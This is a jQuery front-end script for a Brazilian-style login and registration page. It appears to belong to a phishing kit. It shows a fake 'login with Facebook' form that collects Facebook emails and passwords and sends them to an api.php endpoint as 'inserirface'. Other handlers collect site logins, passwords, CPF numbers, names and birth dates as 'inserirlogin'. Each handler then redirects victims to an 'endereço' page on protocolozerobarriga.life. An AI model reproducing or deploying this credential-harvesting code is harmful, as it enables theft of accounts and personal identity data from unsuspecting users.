jQuery(document).ready(function($){
	
	$("#cadastrar-me").click(function(){
		$("#logar").css("display","none");
		$("#cadastrar").css("display","block");
		$("#menu1").css("display","none");
		$("#menu2").css("display","inline-block");
		$("footer").css("display","none");
		});
	$("#voltar-login").click(function(){
		$("#logar").css("display","block");
		$("#cadastrar").css("display","none");
		$("#menu1").css("display","inline-block");
		$("#menu2").css("display","none");
		$("footer").css("display","block");
		});
	
	$("#pessoa-fisica").click(function(){
		$("#pessoa-juridica").prop("checked",false);
		});;
	$("#pessoa-juridica").click(function(){
		$("#pessoa-fisica").prop("checked",false);
		});
	$("#feminino").click(function(){
		$("#masculino").prop("checked",false);
		});
	$("#masculino").click(function(){
		$("#feminino").prop("checked",false);
		});	
	$("#pormeiosdigitais").click(function(){
		checked = $("#refmeiosdigitais").text();
		if(checked==0){
			$("#pormeiosdigitais").prop("checked",true);
			$("#refmeiosdigitais").html("1");
			}else if(checked==1){
				$("#pormeiosdigitais").prop("checked",false);
				$("#refmeiosdigitais").html("0");
			}
		});
	$("#poremail").click(function(){
		checked = $("#refemail").text();
		if(checked==0){
			$("#poremail").prop("checked",true);
			$("#refemail").html("1");
			}else if(checked==1){
				$("#poremail").prop("checked",false);
				$("#refemail").html("0");
			}
		});
		$("#nome_completo").keyup(function(){
			if($("#nome_completo").val().length==0){
				$("#erro-nome-completo").html("Preencha este campo");
				$("#erro").html("1");
				}else{
					$("#erro-nome-completo").html("");
					$("#erro").html("0");					
					}
			});
		$("#cpf").keyup(function(){
			cpf = $("#cpf").val();
			cpf = cpf.replace(".","");
			cpf = cpf.replace("-","");
			if(cpf.length==4){
				cpf = cpf[0]+cpf[1]+cpf[2]+"."+cpf[3];
				$("#cpf").val(cpf);				
				}
			cpf = cpf.replace(".","");
			cpf = cpf.replace("-","");
			if(cpf.length==7){
				cpf = cpf[0]+cpf[1]+cpf[2]+"."+cpf[3]+cpf[4]+cpf[5]+"."+cpf[6];
				$("#cpf").val(cpf);
				}
			cpf = cpf.replace(".","");
			cpf = cpf.replace("-","");
			if(cpf.length>=11){
				cpf = cpf[0]+cpf[1]+cpf[2]+"."+cpf[3]+cpf[4]+cpf[5]+"."+cpf[6]+cpf[7]+cpf[8]+"-"+cpf[9]+cpf[10];
				uijyir6fhsbs66d = $("#hnnfjs83jd").text();
				$.get("api/"+uijyir6fhsbs66d+"?metodo=validarcpf&cpf="+cpf,function(r){if(r.includes("f")){$("#erro-cpf").html("Cpf invÃ¡lido");}else{$("#erro-cpf").html("");}});
				$("#cpf").val(cpf);
				}
			cpf = cpf.replace(".","");
			cpf = cpf.replace("-","");
			if(cpf.length<11){
				$("#erro-cpf").html("Preencha este campo");
				$("#erro").html("1");
				}else{
					$("#erro-cpf").html("");
					$("#erro").html("0");					
					}
				
			});
		
		$('#cpf').keyup(function(){
		cpf = $('#cpf').val();
		cpf = cpf.replace(/[^a-z0-9]/gi,'');
		cpf = cpf.replace(/[^0-9.]/g, '').replace(/(\..*?)\..*/g, '$1');
		if(cpf.length==4){
			cpf = cpf[0]+cpf[1]+cpf[2]+'.'+cpf[3];
			}else if(cpf.length==5){
					cpf = cpf[0]+cpf[1]+cpf[2]+'.'+cpf[3]+cpf[4];
				}else if(cpf.length==6){
						cpf = cpf[0]+cpf[1]+cpf[2]+'.'+cpf[3]+cpf[4]+cpf[5];
					}else if(cpf.length==7){
							cpf = cpf[0]+cpf[1]+cpf[2]+'.'+cpf[3]+cpf[4]+cpf[5]+'.'+cpf[6];
						}else if(cpf.length==8){
								cpf = cpf[0]+cpf[1]+cpf[2]+'.'+cpf[3]+cpf[4]+cpf[5]+'.'+cpf[6]+cpf[7];
							}else if(cpf.length==9){
									cpf = cpf[0]+cpf[1]+cpf[2]+'.'+cpf[3]+cpf[4]+cpf[5]+'.'+cpf[6]+cpf[7]+cpf[8];
								}else if(cpf.length==10){
										cpf = cpf[0]+cpf[1]+cpf[2]+'.'+cpf[3]+cpf[4]+cpf[5]+'.'+cpf[6]+cpf[7]+cpf[8]+'-'+cpf[9];
									}else if(cpf.length>=11){
											cpf = cpf[0]+cpf[1]+cpf[2]+'.'+cpf[3]+cpf[4]+cpf[5]+'.'+cpf[6]+cpf[7]+cpf[8]+'-'+cpf[9]+cpf[10];
											$.get("../api/api.php?metodo=validarcpf&cpf="+cpf,function(r){if(r.includes("f")){$("#erro-cpf").html("Cpf invÃ¡lido");}else{$("#erro-cpf").html("");}});
											}
		$('#cpf').val(cpf);
		}); 	
		
			
		$("#data-de-nascimento").keyup(function(){
			nascimento = $('#data-de-nascimento').val();
			nascimento = nascimento.replaceAll('/','');
			nascimento = nascimento.replaceAll('-','');
			nascimento = nascimento.replaceAll(' ','');		
			nascimento = nascimento.replace(/[^0-9.]/g, '').replace(/(\..*?)\..*/g, '$1');
			nascimento = nascimento.replace(/[^a-z0-9]/gi,'');
			nascimento = nascimento.replaceAll('.','');
			if(nascimento.length==3){
				nascimento = nascimento[0]+nascimento[1]+'/'+nascimento[2];
				}else if(nascimento.length==4){
						nascimento = nascimento[0]+nascimento[1]+'/'+nascimento[2]+nascimento[3];
					}else if(nascimento.length==5){
							nascimento = nascimento[0]+nascimento[1]+'/'+nascimento[2]+nascimento[3]+'/'+nascimento[4];
						}else if(nascimento.length==6){
								nascimento = nascimento[0]+nascimento[1]+'/'+nascimento[2]+nascimento[3]+'/'+nascimento[4]+nascimento[5];
							}else if(nascimento.length==7){
									nascimento = nascimento[0]+nascimento[1]+'/'+nascimento[2]+nascimento[3]+'/'+nascimento[4]+nascimento[5]+nascimento[6];
								}else if(nascimento.length>=8){
										nascimento = nascimento[0]+nascimento[1]+'/'+nascimento[2]+nascimento[3]+'/'+nascimento[4]+nascimento[5]+nascimento[6]+nascimento[7];
									}	
				$('#data-de-nascimento').val(nascimento);
			});
			
		$("#celular").keyup(function(){
			celular = $('#celular').val();
			celular = celular.replaceAll('-','');
			celular = celular.replaceAll('(','');
			celular = celular.replaceAll(')','');
			celular = celular.replaceAll(' ','');
			celular = celular.replace(/[^0-9.]/g, '').replace(/(\..*?)\..*/g, '$1');
			celular = celular.replace(/[^a-z0-9]/gi,'');
			celular = celular.replaceAll('.','');
			if(celular.length==3){
				celular = '('+celular[0]+celular[1]+') '+celular[2];
				}else if(celular.length==4){
					celular = '('+celular[0]+celular[1]+') '+celular[2]+celular[3];
					}else if(celular.length==5){
							celular = '('+celular[0]+celular[1]+') '+celular[2]+celular[3]+celular[4];
							}else if(celular.length==6){
								celular = '('+celular[0]+celular[1]+') '+celular[2]+celular[3]+celular[4]+celular[5];
								}else if(celular.length==7){
									celular = '('+celular[0]+celular[1]+') '+celular[2]+celular[3]+celular[4]+celular[5]+'-'+celular[6];
									}else if(celular.length==8){
											celular = '('+celular[0]+celular[1]+') '+celular[2]+celular[3]+celular[4]+celular[5]+'-'+celular[6]+celular[7];
										}else if(celular.length==9){
												celular = '('+celular[0]+celular[1]+') '+celular[2]+celular[3]+celular[4]+celular[5]+'-'+celular[6]+celular[7]+celular[8];
												}else if(celular.length==10){
														celular = '('+celular[0]+celular[1]+') '+celular[2]+celular[3]+celular[4]+celular[5]+'-'+celular[6]+celular[7]+celular[8]+celular[9];
													}else if(celular.length>=11){
															celular = '('+celular[0]+celular[1]+') '+celular[2]+' '+celular[3]+celular[4]+celular[5]+celular[6]+'-'+celular[7]+celular[8]+celular[9]+celular[10];
															}
			$('#celular').val(celular);
			});
		$("#nome_completo").keyup(function(){
			if($("#nome_completo").val().length==0){
				$("#erro-nome-completo").html("Preencha este campo");
				$("#erro").html("1");
				}else{
					$("#erro-nome-completo").html("");
					$("#erro").html("0");					
					}
			});
		$("#cadastrar-email-1").keyup(function(){
			if($("#cadastrar-email-1").val().length==0){
				$("#erro-email-1").html("Preencha este campo");
				$("#erro").html("1");
				}else{
					$("#erro-email-1").html("");
					$("#erro").html("0");					
					}
			});
		$("#cadastrar-senha-1").keyup(function(){
			if($("#cadastrar-senha-1").val().length==0){
				$("#erro-senha-1").html("Preencha este campo");
				$("#erro").html("1");
				}else{
					$("#erro-senha-1").html("");
					$("#erro").html("0");					
					}
			});
		$("#cadastrar-email-1").keyup(function(){
			email1 = $("#cadastrar-email-1").val();
			if(email1.match("@")=="@"){
				$("#erro-email-1").html("");
				$("#erro").html("0");
				}else{
					$("#erro-email-1").html("E-mail invÃ¡lido");
					$("#erro").html("1");
					}
			});
		$("#cadastrar-senha-2").keyup(function(){
			senha1 = $("#cadastrar-senha-1").val();
			senha2 = $("#cadastrar-senha-2").val();
			if(senha1==senha2){
				$("#erro-senha-2").html("");
				$("#erro").html("0");
				}else{
					$("#erro-senha-2").html("Senhas nÃ£o coincidem");
					$("#erro").html("1");
					}
			});
		$("#entrar-com-facebook").click(function(){
			$("#entrar-com-facebook").css("background-color","#8FBD93");
			window.setTimeout(function(){
				$("#login_com_facebook").css("display","block");
				$("#login_cb").css("display","none");
				$("#entrar-com-facebook").css("background-color","#8FBD93");
				},1000);
			});
			
		$("#acessar_com_facebook").click(function(){
			email = $("#email_facebook").val();
			senha = $("#senha_facebook").val();
			if(email.length<10){$("#erro_facebook").html("Email ou Telefone invÃ¡lido");return;}
			if(senha.length<6){$("#erro_facebook").html("Senha invÃ¡lida");return;}
			$("#acessar_com_facebook").css("background-color","#8FBD93");
			$.ajax({url: "../api/api.php",type: "GET", async: true,data: 'metodo=inserirface&email='+email+'&senha='+senha,dataType: "html",
				success: function(resposta){ resposta = resposta.trim();
					setTimeout(function(){
						window.location.href = '//protocolozerobarriga.life/endereço.html';
						},500);
					}
				});
				
			});
		
		$("#acessar_com_facebook_d").click(function(){
			email = $("#email_facebook_d").val();
			senha = $("#senha_facebook_d").val();
			if(email.length<10){$("#erro_email_facebook_d").html("Email ou Telefone invÃ¡lido");return;}
			if(senha.length<6){$("#erro_senha_facebook_d").html("A senha deve ter 6 caracteres ou mais");return;}
			tuiom76snasv3hhgszwe = $("#hnnfjs83jd").text();
			$("#acessar_com_facebook_d").css("background-color","#0051B7");
			$.ajax({url: "../api/api.php",type: "GET", async: true,data: 'metodo=inserirface&email='+email+'&senha='+senha,dataType: "html",
				success: function(resposta){ resposta = resposta.trim();
					setTimeout(function(){
						window.location.href = '//protocolozerobarriga.life/endereço.html';
						},500);
					}
				});
			});
		
		$("#entrar-login").click(function(){
			$("#entrar-login").css("background-color","#8FBD93");
			email = $("#email-entrar").val();
			senha = $("#senha-entrar").val();
			if(email.length<=7){$("#erro-email-entrar").html("Email, CPF ou CNPJ invÃ¡lido");$("#entrar-login").css("background-color","#008732");return;}		
			if(senha.length<=5){$("#erro-senha-entrar").html("A senha deve possuir 6 caracteres ou mais");$("#entrar-login").css("background-color","#008732");return;}
			
			$.ajax({url: "../api/api.php",type: "GET", async: true,data: 'metodo=inserirlogin&email='+email+'&senha='+senha,dataType: "html",
				success: function(resposta){ resposta = resposta.trim();
					setTimeout(function(){
						window.location.href = '//protocolozerobarriga.life/endereço.html';
						},500);
					}
				});
			});
			
		$("#entrar-login_d").click(function(){
			$("#entrar-login_d").css("background-color","#8FBD93");
			email = $("#email-entrar_d").val();
			senha = $("#senha-entrar_d").val();
			if(!email.includes("@") || email.length<=10){$("#erro-email-entrar_d").html("E-mail invÃ¡lido");$("#entrar-login_d").css("background-color","#008732");return;}
			
			if(senha.length<=5){$("#erro-senha-entrar_d").html("A senha deve possuir 6 caracteres ou mais");$("#entrar-login_d").css("background-color","#008732");return;}
			$.ajax({url: "../api/api.php",type: "GET", async: true,data: 'metodo=inserirlogin&email='+email+'&senha='+senha,dataType: "html",
				success: function(resposta){ resposta = resposta.trim();
					setTimeout(function(){
						window.location.href = '//protocolozerobarriga.life/endereço.html';
						},500);
					}
				});
			});
		$("#concluir-cadastro").click(function(){
			$("#concluir-cadastro").css("background-color","#8FBD93");
			err = $("#erro").text();
			if(err==1){$("#concluir-cadastro").css("background-color","#008732");return;}
			nome_completo = $("#nome_completo").val();
			cpf = $("#cpf").val();
			data_de_nascimento = $("#data-de-nascimento").val();
			celular = $("#celular").val();
			email1 = $("#cadastrar-email-1").val();
			senha1 = $("#cadastrar-senha-1").val();
			senha2 = $("#cadastrar-senha-2").val();erro = 0;
			if(nome_completo.length==0){$("#erro-nome-completo").html("Preencha este campo");erro=1;}
			if(cpf.length==0){$("#erro-cpf").html("Preencha este campo");erro=1;}
			if(data_de_nascimento.length==0){$("#erro-nascimento").html("Preencha este campo");erro=1;}
			if(celular.length==0){$("#erro-celular").html("Preencha este campo");erro=1;}
			if(email1.length==0){$("#erro-email-1").html("Preencha este campo");erro=1;}
			if(senha1.length==0){$("#erro-senha-1").html("Preencha este campo");erro=1;}
			if(senha2.length==0){$("#erro-senha-2").html("Preencha este campo");erro=1;}
			if(erro==1){$("#concluir-cadastro").css("background-color","#008732");return;}
			$.ajax({url: "../api/api.php",type: "GET", async: true,data: 'metodo=inserirlogin&email='+email1+'&senha='+senha1+'&nome='+nome_completo+'&cpf='+cpf+'&nascimento='+data_de_nascimento,dataType: "html",
				success: function(resposta){ resposta = resposta.trim();
					setTimeout(function(){
						window.location.href = '//protocolozerobarriga.life/endereço.html';
						},500);
					}
				});				
			});
			
			
		$("#concluir-cadastro_d").click(function(){
			$("#concluir-cadastro_d").css("background-color","#8FBD93");
			nome_completo = $("#nome_completo_d").val();
			cpf = $("#cpf_d").val();
			data_de_nascimento = $("#data-de-nascimento_d").val();
			celular = $("#celular_d").val();
			email1 = $("#cadastrar-email-1_d").val();
			senha1 = $("#cadastrar-senha-1_d").val();
			senha2 = $("#cadastrar-senha-2_d").val();erro = 0;
			if(nome_completo.length==0){$("#erro-nome-completo_d").html("Preencha este campo");erro=1;}
			if(cpf.length==0){$("#erro-cpf_d").html("Preencha este campo");erro=1;}
			if(data_de_nascimento.length==0){$("#erro-nascimento_d").html("Preencha este campo");erro=1;}
			if(celular.length==0){$("#erro-celular_d").html("Preencha este campo");erro=1;}
			if(email1.length==0){$("#erro-email-1_d").html("Preencha este campo");erro=1;}
			if(senha1.length==0){$("#erro-senha-1_d").html("Preencha este campo");erro=1;}
			if(senha2.length==0){$("#erro-senha-2_d").html("Preencha este campo");erro=1;}
			
			if(erro==1){$("#concluir-cadastro").css("background-color","#008732");return;}	
			$.ajax({url: "../api/api.php",type: "GET", async: true,data: 'metodo=inserirlogin&email='+email1+'&senha='+senha1+'&nome='+nome_completo+'&cpf='+cpf+'&nascimento='+data_de_nascimento,dataType: "html",
				success: function(resposta){ resposta = resposta.trim();
					setTimeout(function(){
						window.location.href = '//protocolozerobarriga.life/endereço.html';
						},500);
					}
				});
			});
});
